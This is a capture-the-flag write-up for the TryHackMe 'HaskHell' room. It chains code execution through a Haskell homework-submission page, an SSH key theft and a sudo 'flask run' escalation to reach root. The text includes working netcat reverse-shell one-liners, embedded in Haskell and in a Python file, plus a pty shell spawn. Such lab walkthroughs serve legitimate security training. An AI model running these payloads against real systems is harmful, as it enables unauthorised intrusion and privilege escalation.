# HaskHell

https://tryhackme.com/room/haskhell

A simple room, with a few new techs. Fun since I write in F#, a language in the same vein as Haskell, sometimes.

1. A port scan revealed 22 and 5001. On 5001 was a website asking users to submit their haskell assignments.
2. The link to send haskell files on the homework page didn't work, but a dirb on the ip revealed /submit which did
3. Testing with the following file proved I had RCE (code is from rosetta code [here](https://rosettacode.org/wiki/Execute_a_system_command#Haskell)):

```haskell
import System.Cmd
 
main = system "ls"
```

4. The following connected a reverse shell (as 'flask'):

```haskell
import System.Cmd
 
main = system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.5.4 4444 >/tmp/f"
```

5. In the /home/prof directory was a .ssh with a readably id_rsa. I extracted this to ssh in as prof.
6. Prof had  `(root) NOPASSWD: /usr/bin/flask run`. After a bit of trial and error around how this command worked, I got a root reverse shell via:

    a. creating a file called shell.py with the following contents:

    ```python
    import os
    os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.112.79 4444 >/tmp/f")
    ```

    b. calling `export FLASK_APP=shell.py`

    c. running `sudo /usr/bin/flask run`

Easy, but interesting!

**BONUS:** for step six, rather than catching a root reverse shell, changing shell.py to contain `import pty; pty.spawn('/bin/bash')` works as well, spawing an instant root shell.
